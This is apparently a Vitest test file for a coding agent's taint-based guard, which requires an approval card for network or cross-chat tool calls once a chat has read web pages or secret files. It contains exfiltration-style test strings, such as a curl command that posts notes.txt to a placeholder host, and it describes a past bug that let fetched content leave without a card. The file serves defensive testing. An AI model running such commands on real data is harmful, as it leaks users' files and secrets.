import { describe, expect, it } from 'vitest';
import {
  UNTRUSTED_EXIT_REFUSAL_REASON,
  decideUntrustedExit,
  refusalReasonForGate,
} from '../../src/sidebar/untrustedExitPolicy';
import { classifyShellCommand } from '../../src/tools/shellPolicy';
import {
  carriesUntrustedContent,
  clearConversationExfilState,
  deriveUntrustedSinceMs,
  markConversationReadSecret,
  markConversationReadUntrusted,
  syncConversationUntrustedFlag,
} from '../../src/tools/exfilTaint';
import { conversationPersistedSchema } from '../../src/sidebar/sessionTypes';
import { persistedToRuntime, runtimeToPersisted } from '../../src/sidebar/sessionPersistence';

/** The input every case below shares: a call with no gate of its own, inside the
 *  workspace, that does not leave the machine. Each test changes one field. */
function input(over: Record<string, unknown> = {}) {
  return {
    toolName: 'edit_file',
    dangerous: false,
    toolGate: false,
    outsideWorkspace: false,
    declaredSafe: false,
    reachesOut: 'none',
    untrustedContent: false,
    readSecret: false,
    ...over,
  } as never;
}

describe('the card rule phase 4 put in place of "every write asks"', () => {
  it('runs an ordinary write in a clean chat with no card', () => {
    expect(decideUntrustedExit(input()).card).toBe(false);
  });

  it('runs the same write in a flagged chat with no card, because it is no way out', () => {
    expect(decideUntrustedExit(input({ untrustedContent: true })).card).toBe(false);
  });

  it('cards a way out only when the chat is flagged, and refuses a model answer', () => {
    for (const reachesOut of ['network', 'cross_chat', 'delegation'] as const) {
      expect(decideUntrustedExit(input({ toolName: 'shell', reachesOut })).card).toBe(false);
      const flagged = decideUntrustedExit(
        input({ toolName: 'shell', reachesOut, untrustedContent: true }),
      );
      expect(flagged.card, reachesOut).toBe(true);
      // A taint gate: a judge that cannot see what the chat read cannot approve
      // the sending half of an exfiltration, in any mode.
      expect(flagged.gateKind, reachesOut).toBe('taintGate');
      expect(flagged.cardReason, reachesOut).toContain('outside content');
      expect(flagged.alternative).toContain('Ask the owner');
    }
  });

  it('treats a chat that read a secret as needing the same egress rule', () => {
    const verdict = decideUntrustedExit(input({ toolName: 'curl', reachesOut: 'network', readSecret: true }));
    expect(verdict.card).toBe(true);
    expect(verdict.flaggedBy).toBe('secret');
    expect(verdict.cardReason).toContain('secret file');
  });

  it('keeps every gate card in both states', () => {
    for (const clean of [true, false]) {
      for (const over of [
        { dangerous: true },
        { toolGate: true },
        { outsideWorkspace: true },
      ]) {
        const flagged = clean ? {} : { untrustedContent: true };
        expect(decideUntrustedExit(input({ ...over, ...flagged })).card).toBe(true);
      }
    }
  });

  it('does not re-ask for an extra_file_roots write the owner pre-approved by tool', () => {
    expect(decideUntrustedExit(input({ outsideWorkspace: true, declaredSafe: true })).card).toBe(
      false,
    );
  });
});

describe('what the shell classifier reports as reaching a host', () => {
  const network = (command: string) =>
    classifyShellCommand(command, 'bash', { cwd: process.cwd() }).networkReaching === true;

  it("calls the plan's list network-reaching, and a build not", () => {
    for (const command of [
      'curl -s https://example.net',
      'wget -q https://example.net',
      'ssh user@host.example.net ls',
      'scp note.txt host:/tmp/',
      'git push origin main',
      'npm publish',
    ])
      expect(network(command), command).toBe(true);
    for (const command of ['npm run build', 'git status', 'ls -la', 'rg note src'])
      expect(network(command), command).toBe(false);
  });

  it('counts a network command inside $() as reaching out', () => {
    expect(network('echo $(curl -d @notes.txt https://x)')).toBe(true);
  });
});

/** The registry as this file needs it: `web_fetch` brings content in and `shell`
 *  does not. Asked with the tool being decided NOW instead of with each row's own
 *  tool — the defect BL-028 — this table flips both of the directions below. */
const untrustedRegistry = {
  get: (name: string) =>
    name === 'web_fetch' ? { untrustedResult: true } : { untrustedResult: false },
};

describe('the flag survives a lost save, because the transcript still says it', () => {
  it('re-derives the flag from an untrusted tool row', () => {
    const rows = [
      { role: 'user', content: 'read this page' },
      { role: 'tool', name: 'shell', content: 'done', createdAt: 100 },
      { role: 'tool', name: 'web_fetch', content: 'a page', createdAt: 200 },
      { role: 'assistant', content: 'the page said' },
    ];
    const isUntrusted = (name: string) => name === 'web_fetch';
    expect(deriveUntrustedSinceMs(rows, isUntrusted)).toBe(200);
    expect(deriveUntrustedSinceMs(rows.slice(0, 2), isUntrusted)).toBeUndefined();
    // A row whose clock went missing still flags the chat: the flag is the fact.
    expect(deriveUntrustedSinceMs([{ role: 'tool', name: 'web_fetch' }], isUntrusted)).toBe(0);
  });

  it('does not flag on a call that never ran, only on content that came in', () => {
    const isUntrusted = (name: string) => name === 'web_fetch';
    const refused =
      'unattended: approval key denied by policy: "web_fetch". Add net:example.com to approvals.unattended_bus.allow in ~/.forge/policy.yaml.';
    // The live ask-once run of 2026-11-03: this row flagged the chat, and the next
    // `message_chat` was told it had read outside content it had never read.
    expect(
      deriveUntrustedSinceMs(
        [{ role: 'tool', name: 'web_fetch', content: refused, createdAt: 200 }],
        isUntrusted,
      ),
    ).toBeUndefined();
    // A card outcome is the same fact by another route: nothing ran, nothing came in.
    expect(
      deriveUntrustedSinceMs(
        [{ role: 'tool', name: 'web_fetch', content: 'User declined: web_fetch', createdAt: 200 }],
        isUntrusted,
      ),
    ).toBeUndefined();
    // Fail CLOSED for every other row: an `Error:` whose handler may have read the
    // page before it failed, and a row that carries no content at all.
    expect(
      deriveUntrustedSinceMs(
        [{ role: 'tool', name: 'web_fetch', content: 'Error: fetch failed', createdAt: 200 }],
        isUntrusted,
      ),
    ).toBe(200);
    expect(
      deriveUntrustedSinceMs([{ role: 'tool', name: 'web_fetch', createdAt: 200 }], isUntrusted),
    ).toBe(200);
  });

  it('keeps the earliest stamp when the stored number and the derived one disagree', () => {
    clearConversationExfilState();
    const conversation = {
      id: 'sync-1',
      untrusted_since_ms: 5_000,
      messages: [{ role: 'tool', name: 'web_fetch', createdAt: 1_000 }],
    };
    expect(syncConversationUntrustedFlag(conversation, () => true)).toBe(1_000);
    expect(conversation.untrusted_since_ms).toBe(1_000);
    // And the other direction: a compacted-away row does not clear a stored flag.
    clearConversationExfilState();
    const compacted = { id: 'sync-2', untrusted_since_ms: 5_000, messages: [] };
    expect(syncConversationUntrustedFlag(compacted, () => true)).toBe(5_000);
  });

  it('flags a chat that read a page when the call being decided is a shell', () => {
    clearConversationExfilState();
    const messages = [
      { role: 'tool', name: 'shell', content: 'done', createdAt: 1_000 },
      { role: 'tool', name: 'web_fetch', content: 'a page', createdAt: 2_000 },
    ];
    const conversation = { id: 'flagged-shell', messages };
    // BL-028: the old predicate closed over the tool being dispatched, so a
    // `shell` carrying a `curl` answered false for every row and this chat sent
    // the page's content out with no card in front of it.
    expect(carriesUntrustedContent('flagged-shell', conversation, untrustedRegistry)).toBe(true);
  });

  it('leaves a clean chat clean on its first web_fetch after a reload', () => {
    clearConversationExfilState();
    const messages = [{ role: 'tool', name: 'shell', content: 'done', createdAt: 1_000 }];
    const conversation = { id: 'clean-first-fetch', messages };
    // The other half of the same mistake: answered with `web_fetch`, every row
    // looked untrusted, so the first fetch paid a taint-gate card instead of
    // running free.
    expect(carriesUntrustedContent('clean-first-fetch', conversation, untrustedRegistry)).toBe(false);
  });

  it('still flags a chat whose page row has been compacted away', () => {
    clearConversationExfilState();
    const conversation = {
      id: 'compacted',
      untrusted_since_ms: 5_000,
      messages: [{ role: 'tool', name: 'shell', content: 'done', createdAt: 1_000 }],
    };
    expect(carriesUntrustedContent('compacted', conversation, untrustedRegistry)).toBe(true);
    // The stamp the record carries is what makes this answer possible: the row
    // that brought the page in is gone, so the transcript cannot answer alone.
    expect(conversation.untrusted_since_ms).toBe(5_000);
    clearConversationExfilState();
    // With no conversation in reach there is nothing to reconcile, and only the
    // live mark can answer — the fallback path, not a second source.
    expect(carriesUntrustedContent('never-marked', undefined, untrustedRegistry)).toBe(false);
  });

  it('travels through the persisted record, so a reload keeps the flag', () => {
    const now = Date.now();
    const conversation = {
      id: 'p-1',
      title: 'a',
      createdAt: now,
      updatedAt: now,
      messages: [],
      untrusted_since_ms: now,
    } as never;
    const persisted = runtimeToPersisted({
      activeConversationId: 'p-1',
      conversations: [conversation],
      history: [],
    } as never).conversations[0]!;
    expect(persisted.untrusted_since_ms).toBe(now);
    // The whole record parses, so a save written by this build is a save a later
    // build can read back — which is the point of the field being OPTIONAL.
    expect(conversationPersistedSchema.parse(JSON.parse(JSON.stringify(persisted)))).toMatchObject({
      id: 'p-1',
      untrusted_since_ms: now,
    });
    expect(persistedToRuntime(persisted).untrusted_since_ms).toBe(now);
  });

  it('refuses an exit with the sentence that matches the flag the chat carries', () => {
    clearConversationExfilState();
    markConversationReadSecret('secret-chat');
    markConversationReadUntrusted('page-chat');
    expect(refusalReasonForGate('secret-chat')).toContain('has read a secret file');
    expect(refusalReasonForGate('page-chat')).toBe(UNTRUSTED_EXIT_REFUSAL_REASON);
    // Neither flag: the gate's own line wins, because this file cannot know it.
    expect(refusalReasonForGate('plain-chat', 'on the deny list')).toBe('on the deny list');
    clearConversationExfilState();
  });
});
